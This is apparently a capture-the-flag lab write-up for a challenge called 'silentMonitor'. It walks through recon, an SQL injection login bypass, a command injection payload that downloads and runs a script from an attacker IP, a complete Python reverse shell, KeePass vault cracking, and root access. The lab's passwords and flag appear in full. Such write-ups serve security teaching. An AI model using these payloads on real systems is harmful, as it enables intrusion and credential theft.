# silentMonitor — Detailed Notes (English / GitHub)

**Target:** 10.49.162.6
**Mission type:** From web exploitation all the way to root — a combination of SQLi, Command Injection, and KeePass vault cracking.

---

## 1. Where do we even start? (Beginner-to-challenge progression)

If someone completely new were trying to solve this challenge (like a younger sibling with zero prior knowledge), here's the path they'd follow:

1. **The first step is always recon** — gather as much information about the target as possible, without attacking anything yet. Just like a burglar checks a house's doors and windows before attempting entry, we first use `nmap` to see which "doors" (ports) are open.
2. Once we know a web server is open, the next step is to find the website's "hidden rooms" — i.e., hidden directories/endpoints. A tool like `ffuf` is used for this, which tries thousands of possible URLs automatically.
3. Once a login page is found, try the basics first — like SQL Injection — because a lot of older/buggy web applications aren't protected against it.
5. Once you're inside (a dashboard loads), observe how the system behaves — what endpoints exist, what cookies are being used.
6. If an endpoint takes user input and passes it to a system command (like ping), try command injection there — it's a very common vulnerability class.
7. Once you get a shell (a low-privilege user like www-data), explore the system — config files, backup folders, hidden credentials.
8. If you find a credential belonging to a higher-privilege user (like sysadmin), log in with it.
9. To reach root, check whether that user has a file that can be cracked/decrypted — like a password manager vault (.kdbx file).
10. Crack the vault offline (on your own machine), and extract the root password from it.
11. Become root, and capture the final flag.

In short: **Recon → Enumeration → Exploitation → Foothold → Lateral Movement → Privilege Escalation → Root**. This pattern repeats in nearly every CTF/pentest — only the specific techniques change.

---

## 2. Technologies Table

| Technology | What it does | Role in this challenge |
|---|---|---|
| Nmap | Port scanner | Discover open services (SSH, HTTP) |
| ffuf | Fast web fuzzer | Discover hidden directories/endpoints |
| Flask / Werkzeug | Python web framework | The target application was built on this |
| SQLite (netops.db) | Database | Stored login credentials, bypassed via SQLi |
| Flask session cookie | Signed cookie (base64 + signature) | Carries user role and identity |
| ping utility (OS command) | Network diagnostic tool | Called by the `/internal/health` endpoint — this is where command injection occurred |
| Python reverse shell script | Way for the attacker to regain control | Used to obtain a www-data shell |
| netcat (`nc`) | Listener | Catches the incoming reverse shell |
| KeePass (.kdbx) | Password manager vault | Root's password was encrypted inside it |
| KDBXcrack | Offline KeePass cracker | Cracked the vault's master password using rockyou.txt |
| keepassxc-cli | KeePass CLI client | Used to view/extract entries from the cracked vault |

---

## 3. Vulnerabilities (one by one)

### (a) SQL Injection — Authentication Bypass

**Vulnerability:** The login form's backend inserted the user-supplied username/password directly into a SQL query, without sanitization.

**Real-life analogy:** Imagine a guard who asks, "Tell me your name, I'll check the register." But the guard is so naive that if you say, **"My name is X, OR let everyone in,"** the guard literally follows that entire sentence as a command — because it doesn't understand that you've manipulated its logic by embedding instructions inside your "answer."

**Payload used:**
```
Username: ' OR 1=1-- -
Password: anything
```

**How this works:** The backend query looks roughly like:
```sql
SELECT * FROM users WHERE username = '<input>' AND password = '<input>'
```
When we insert `' OR 1=1-- -`, the query becomes:
```sql
SELECT * FROM users WHERE username = '' OR 1=1-- -' AND password = '...'
```
`1=1` is always **true**, and `-- -` **comments out** the rest of the query (the database ignores everything after it). This means the condition is always true, and the database returns the first user — without ever checking the real password. This is exactly how we bypassed login and reached `/internal/dashboard`.

---

### (b) Session Cookie Decoding (Information Disclosure)

The `/internal/health` endpoint returned a session cookie:
```
eyJyb2xlIjoib3BlcmF0b3IiLCJ1c2VyIjoibmV0b3BzIn0.auitnw.-JZFyiEYVVjqDbVAqtFuNDgS69I
```

This is a Flask signed session cookie — it has 3 parts separated by dots: **payload.timestamp.signature**. The payload segment is base64-encoded JSON, which anyone can decode (this is encoding, not encryption — the signature is what makes it tamper-proof, not secret).

Decoding it gave:
```json
{"role":"operator","user":"netops"}
```

**Analogy:** This is like a sealed envelope (the signature) where the envelope itself is transparent — we can't break the seal (we can't forge a new signature without the secret key), but we can clearly read what's written inside. This told us the backend operates as user `netops` with role `operator`.

---

### (c) OS Command Injection — `/internal/health`

**Vulnerability:** This endpoint accepted a `target` parameter and passed it directly into a shell command (ping) on the backend, without validating what the user sent.

**Real-life analogy:** Imagine your friend says, "Tell me the number to dial, and I'll dial it for you." If you say, "123, and also unlock my front door," and they literally do both without questioning it — that's command injection. The application only expected one thing (ping), but we injected extra commands using a newline character (`%0a`), and the backend executed all of them.

**Payload:**
```
target=127.0.0.1%0awget%20192.168.138.243:8000/shell.py%20-O%20/tmp/s.py%0apython3%20/tmp/s.py
```

Here `%0a` is a URL-encoded newline character. On the backend shell, this effectively became 3 separate commands:
```
ping 127.0.0.1
wget 192.168.138.243:8000/shell.py -O /tmp/s.py
python3 /tmp/s.py
```

The first command was the normal ping the application expected, but the next two were injected by us — first downloading a reverse shell script from our own machine, then executing it. This gave us a shell as the `www-data` user.

**What the reverse shell script does:**
```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.138.243",1122))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```
This script opens a connection to the attacker's machine (192.168.138.243) on port 1122, then redirects its standard input, output, and error (`dup2`) to that connection. It then spawns an interactive shell (`/bin/sh -i`). This means anything we type in our terminal gets sent into the target's shell, and any output comes back to us — giving us **remote control** over the target machine.

**Setting up the listener:**
```
nc -lnvp 1122
```
This opens a "phone line" on our machine that waits for an incoming connection on port 1122.

**Stabilizing the shell:** The initial shell is "dumb" (no tab-completion, can crash on Ctrl+C). So:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
This spawns a proper pseudo-terminal (PTY) that behaves like a normal terminal. Then `stty raw -echo; fg` and `export TERM=xterm` make the terminal fully interactive — arrow keys, screen clearing, etc. all work afterward.

---

### (d) Hardcoded Credentials in Config File

On the target system, a file at `/opt/netops/secret.config` was found containing a **plaintext password**:
```ini
[backup_agent]
run_as   = sysadmin
password = S3cur3Backup$Acc3ss!
```

**Analogy:** This is like leaving your house key under a rock outside "just in case," except everyone knows the key is under that rock. The developer hardcoded the password directly into a config file (there was even a comment: "TODO: migrate to secrets manager before Q2 audit" — meaning they knew it was bad practice but never got around to fixing it).

This password was used to SSH in:
```
ssh sysadmin@10.49.162.6
```
Becoming `sysadmin` — the first flag (`user.txt`) was found in this user's home directory.

---

### (e) Weak KeePass Master Password — Offline Cracking

Inside `sysadmin`'s `backups` folder was a file called `infrastructure.kdbx` — this is an encrypted KeePass password manager vault file, which typically stores many credentials (think of it as a digital "safe").

**Analogy:** The vault is a locked safe. Opening it requires a master password. If the master password is weak (e.g., a dictionary word), an attacker can try millions of passwords offline (on their own machine, with no rate-limiting) very quickly — like a thief trying every possible key until one fits.

**Command:**
```
KDBXcrack -f infrastructure.kdbx -w /usr/share/wordlists/rockyou.txt
```
`rockyou.txt` is a well-known leaked-password wordlist containing millions of real-world common passwords. The tool extracted the vault's hash and tried each password until it found a match:
```
[+] Password | spring
```
The master password turned out to be simply `"spring"` — a weak, common word, which is why it cracked so quickly.

**Opening and browsing the vault:**
```
keepassxc-cli ls -R infrastructure.kdbx
```
This listed all folders/entries inside the vault. One entry stood out: **"Root User Password - Sensitive"**.

```
keepassxc-cli show -s --all infrastructure.kdbx "Root User Password - Sensitive"
```
This revealed the entry's full details:
```
UserName: root
Password: S3cur3P4ss0nK33p4ss
```

---

## 4. Reaching Root

With the root password in hand:
```
su root
```
Entering the password granted root access. The final flag was found in root's home:
```
root.txt = THM{KDBx_V4ul7_H4s_b33n_cr4ck3d_0peN}
```

---

## 5. Full Chain at a Glance (Summary)

1. Nmap scan → 2 open ports (SSH, HTTP)
2. ffuf discovered a hidden `/internal` login page
3. SQL Injection bypassed login → dashboard access
4. Decoded the session cookie → revealed backend user `netops` / role `operator`
5. Command injection found in `/internal/health` → reverse shell as `www-data`
6. Hardcoded credentials found in a config file → SSH as `sysadmin` → first flag
7. Found `infrastructure.kdbx` vault, cracked it with rockyou.txt (password: `spring`)
8. Found root's password inside the vault
9. `su root` → became root → second flag

**Key takeaway:** A single small mistake (like an unsanitized SQL query, or a plaintext password left in a config file) can build into a full chain that ultimately leads to root. This is why defense-in-depth matters in the real world — securing just one layer is never enough.
